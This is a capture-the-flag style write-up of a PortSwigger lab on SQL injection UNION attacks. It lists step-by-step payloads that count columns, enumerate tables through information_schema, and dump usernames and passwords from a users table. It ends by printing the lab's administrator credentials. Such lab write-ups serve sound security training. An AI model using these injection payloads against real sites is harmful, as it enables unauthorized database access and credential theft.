**Lab: SQL Injection UNION attack – Retrieving data from other tables** - **Link:** [https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)


**Goal:**
Retrieve the administrator’s password from the `users` table and log in as administrator.


**Step-by-step:**
Access the lab, open Burp Suite, and capture a request.

**1. Determine number of columns**
Test with `ORDER BY` until it breaks:

```
' ORDER BY 1--         → OK  
' ORDER BY 2--         → OK  
' ORDER BY 3--         → ERROR  
```

Means: 2 columns


**2. Determine data types in columns**
Try:

```
' UNION SELECT NULL,NULL--         → OK  
' UNION SELECT 'a',NULL--          → OK  
' UNION SELECT 'a','a'--           → OK  
```

Both columns accept text


**3. Enumerate table names**
Use information schema:

```
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

Look for a table called: `users`


**4. Enumerate column names from `users` table**

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

Found columns: `username`, `password`


**5. Retrieve credentials from `users` table**

```
' UNION SELECT username,password FROM users--
```

Output:

```
wiener         cd5phuq6iy3tp5rxdgxs  
administrator  osmnvjx88cco5t85q9fh  
carlos         hf9xwpsozcwq3eslljhq  
```


**6. Log in as administrator**
Go to **My account** and log in using:

```
username: administrator  
password: osmnvjx88cco5t85q9fh  
```


**Lab Solved**
